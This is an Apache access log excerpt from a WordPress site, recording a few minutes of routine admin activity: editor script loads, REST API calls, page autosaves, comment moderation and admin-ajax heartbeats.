47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=6.1.1 HTTP/1.1" 200 889 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=6.1.1 HTTP/1.1" 200 824 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/clipboard.min.js?ver=2.0.11 HTTP/1.1" 200 3501 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/shortcode.min.js?ver=6.1.1 HTTP/1.1" 200 1495 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/dist/edit-post.min.js?ver=2baffbeec6cbe5171dee HTTP/1.1" 200 31258 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/media-editor.min.js?ver=6.1.1 HTTP/1.1" 200 3955 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/media-audiovideo.min.js?ver=6.1.1 HTTP/1.1" 200 3693 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/imgareaselect/jquery.imgareaselect.min.js?ver=6.1.1 HTTP/1.1" 200 4049 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-admin/js/image-edit.min.js?ver=6.1.1 HTTP/1.1" 200 4121 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-admin/js/media-upload.min.js?ver=6.1.1 HTTP/1.1" 200 961 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/dist/block-directory.min.js?ver=000a47d4ebe2ceac3593 HTTP/1.1" 200 7346 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/dist/format-library.min.js?ver=57876a359eac66da202b HTTP/1.1" 200 7106 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/tinymce/plugins/compat3x/plugin.min.js?ver=49110-20201110 HTTP/1.1" 200 2090 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/mce-view.min.js?ver=6.1.1 HTTP/1.1" 200 4112 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.17 HTTP/1.1" 200 39142 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/dist/editor.min.js?ver=c9102d37531f38da0681 HTTP/1.1" 200 42246 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/media-views.min.js?ver=6.1.1 HTTP/1.1" 200 26094 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:29 +0000] "GET /wp-includes/js/tinymce/tinymce.min.js?ver=49110-20201110 HTTP/1.1" 200 124876 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
171.33.4.50 - - [05/Sep/2023:02:34:34 +0000] "POST /index.php/wp-json/wp/v2/users/me?_locale=user HTTP/1.1" 200 2589 "http://www.sipress.com/wp-admin/post-new.php?post_type=page" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:34:34 +0000] "GET /index.php/wp-json/wp/v2/ HTTP/1.1" 200 159899 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:34 +0000] "GET /index.php/wp-json/wp/v2/users/me?context=edit&_locale=user HTTP/1.1" 200 1650 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:35 +0000] "GET /index.php/wp-json/wp/v2/blocks?context=edit&per_page=100&_locale=user HTTP/1.1" 200 679 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:35 +0000] "GET /?p=11&_wp-find-template=true HTTP/1.1" 200 2226 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:35 +0000] "GET /index.php/wp-json/wp/v2/block-patterns/categories?_locale=user HTTP/1.1" 200 932 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:35 +0000] "GET /index.php/wp-json/?_fields=description%2Cgmt_offset%2Chome%2Cname%2Csite_icon%2Csite_icon_url%2Csite_logo%2Ctimezone_string%2Curl&_locale=user HTTP/1.1" 200 1098 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:35 +0000] "GET /index.php/wp-json/wp/v2/templates/twentytwentythree//single?context=edit&_locale=user HTTP/1.1" 403 777 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:34:35 +0000] "GET /index.php/wp-json/wp/v2/block-patterns/patterns?_locale=user HTTP/1.1" 200 18709 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
171.33.4.50 - - [05/Sep/2023:02:34:37 +0000] "POST /index.php/wp-json/wp/v2/pages/9/autosaves?_locale=user HTTP/1.1" 200 1245 "http://www.sipress.com/wp-admin/post-new.php?post_type=page" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::1 - - [05/Sep/2023:02:34:40 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)"
::1 - - [05/Sep/2023:02:34:43 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)"
240.136.42.209 - - [05/Sep/2023:02:34:50 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/users.php?id=13" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:34:56 +0000] "GET /index.php/wp-json/wp/v2/taxonomies/category?context=edit&_locale=user HTTP/1.1" 200 2703 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:34:56 +0000] "GET /index.php/wp-json/wp/v2/settings?_locale=user HTTP/1.1" 403 737 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:34:56 +0000] "GET /index.php/wp-json/wp/v2/taxonomies/post_tag?context=edit&_locale=user HTTP/1.1" 200 2510 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:34:56 +0000] "GET /index.php/wp-json/wp/v2/categories?context=edit&_locale=user HTTP/1.1" 200 1349 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:35:01 +0000] "POST /index.php/wp-json/wp/v2/users/me?_locale=user HTTP/1.1" 200 1908 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.112.25.200 - - [05/Sep/2023:02:35:03 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:35:11 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 630 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:35:18 +0000] "GET /index.php/wp-json/wp/v2/settings?_locale=user HTTP/1.1" 403 737 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:18 +0000] "GET /index.php/wp-json/wp/v2/categories?context=edit&_locale=user HTTP/1.1" 403 766 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:18 +0000] "GET /index.php/wp-json/wp/v2/taxonomies/post_tag?context=edit&_locale=user HTTP/1.1" 200 2510 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:18 +0000] "GET /index.php/wp-json/wp/v2/taxonomies/category?context=edit&_locale=user HTTP/1.1" 200 2703 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:18 +0000] "GET /index.php/wp-json/wp/v2/themes?context=edit&status=active&_locale=user HTTP/1.1" 200 3921 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:21 +0000] "POST /index.php/wp-json/wp/v2/posts/11?_locale=user HTTP/1.1" 200 3237 "http://www.sipress.com/wp-admin/post-new.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:22 +0000] "POST /wp-admin/post.php?post=11&action=edit&meta-box-loader=1&meta-box-loader-nonce=209b2e33a1&_locale=user HTTP/1.1" 302 485 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:22 +0000] "GET /wp-admin/post.php?post=11&action=edit&message=4 HTTP/1.1" 200 53983 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:27 +0000] "POST /index.php/wp-json/wp/v2/users/me?_locale=user HTTP/1.1" 200 1942 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:27 +0000] "OPTIONS /index.php/wp-json/wp/v2/posts/11?_locale=user HTTP/1.1" 200 12708 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:27 +0000] "GET /index.php/wp-json/wp/v2/users?context=view&who=authors&per_page=50&_fields=id%2Cname&_locale=user HTTP/1.1" 200 943 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:27 +0000] "GET /index.php/wp-json/wp/v2/taxonomies?context=edit&per_page=100&_locale=user HTTP/1.1" 200 4592 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:31 +0000] "POST /index.php/wp-json/wp/v2/posts/11?_locale=user HTTP/1.1" 200 3237 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:31 +0000] "POST /wp-admin/post.php?post=11&action=edit&meta-box-loader=1&meta-box-loader-nonce=209b2e33a1&_locale=user HTTP/1.1" 302 485 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:31 +0000] "GET /wp-admin/post.php?post=11&action=edit&message=4 HTTP/1.1" 200 53998 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 524 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:33 +0000] "GET /wp-admin/edit.php?post_type=post HTTP/1.1" 200 12682 "http://www.sipress.com/wp-admin/post.php?post=11&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:33 +0000] "GET /wp-admin/js/tags-suggest.min.js?ver=6.1.1 HTTP/1.1" 200 1423 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:33 +0000] "GET /wp-admin/js/inline-edit-post.min.js?ver=6.1.1 HTTP/1.1" 200 3288 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:35:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 578 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
171.33.4.50 - - [05/Sep/2023:02:35:37 +0000] "POST /index.php/wp-json/wp/v2/pages/9/autosaves?_locale=user HTTP/1.1" 200 1348 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:35:40 +0000] "GET /wp-admin/user-new.php HTTP/1.1" 200 10544 "http://www.sipress.com/wp-admin/users.php?id=13" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:35:42 +0000] "GET /wp-admin/profile.php HTTP/1.1" 200 12942 "http://www.sipress.com/wp-admin/user-new.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:35:43 +0000] "GET / HTTP/1.1" 200 10298 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:35:44 +0000] "GET /wp-admin/edit.php?post_type=page HTTP/1.1" 200 13682 "http://www.sipress.com/wp-admin/profile.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:35:44 +0000] "GET /wp-admin/js/tags-suggest.min.js?ver=6.1.1 HTTP/1.1" 200 1423 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:35:44 +0000] "GET /wp-admin/js/inline-edit-post.min.js?ver=6.1.1 HTTP/1.1" 200 3289 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:35:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 872 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:35:47 +0000] "GET / HTTP/1.1" 200 10297 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:35:48 +0000] "GET /wp-admin/ HTTP/1.1" 200 13577 "http://www.sipress.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:35:48 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:35:48 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
172.20.129.51 - - [05/Sep/2023:02:35:50 +0000] "GET /wp-admin/profile.php HTTP/1.1" 200 10937 "http://www.sipress.com/wp-admin/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:35:51 +0000] "GET /wp-admin/profile.php HTTP/1.1" 200 10932 "http://www.sipress.com/wp-admin/profile.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:35:56 +0000] "GET /wp-admin/index.php HTTP/1.1" 200 13579 "http://www.sipress.com/wp-admin/profile.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:35:56 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:35:59 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:36:00 +0000] "GET /index.php/2023/08/30/hello-world/ HTTP/1.1" 200 13516 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
172.20.129.51 - - [05/Sep/2023:02:36:00 +0000] "GET /wp-includes/js/comment-reply.min.js?ver=6.1.1 HTTP/1.1" 200 1701 "http://www.sipress.com/index.php/2023/08/30/hello-world/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:36:03 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:36:03 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
::1 - - [05/Sep/2023:02:36:09 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)"
172.20.129.51 - - [05/Sep/2023:02:36:11 +0000] "POST /wp-comments-post.php HTTP/1.1" 302 465 "http://www.sipress.com/index.php/2023/08/30/hello-world/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:36:11 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 630 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
172.20.129.51 - - [05/Sep/2023:02:36:11 +0000] "GET /index.php/2023/08/30/hello-world/?unapproved=2&moderation-hash=b161c55854006cc853dcbb00e7e86edc HTTP/1.1" 200 13726 "http://www.sipress.com/index.php/2023/08/30/hello-world/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:36:14 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:36:15 +0000] "GET /wp-admin/profile.php HTTP/1.1" 200 11705 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:36:16 +0000] "GET /wp-admin/edit-comments.php HTTP/1.1" 200 13509 "http://www.sipress.com/wp-admin/profile.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:36:18 +0000] "GET /wp-admin/edit-comments.php?p=1&comment_status=moderated HTTP/1.1" 200 13172 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:36:18 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
47.53.122.78 - - [05/Sep/2023:02:36:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
240.136.42.209 - - [05/Sep/2023:02:36:39 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:36:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 872 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:36:48 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
240.136.42.209 - - [05/Sep/2023:02:36:59 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:42:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:42:48 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
240.136.42.209 - - [05/Sep/2023:02:42:59 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:43:03 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
171.33.4.50 - - [05/Sep/2023:02:43:11 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 630 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:43:19 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:43:24 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=moderated" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:43:29 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:43:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
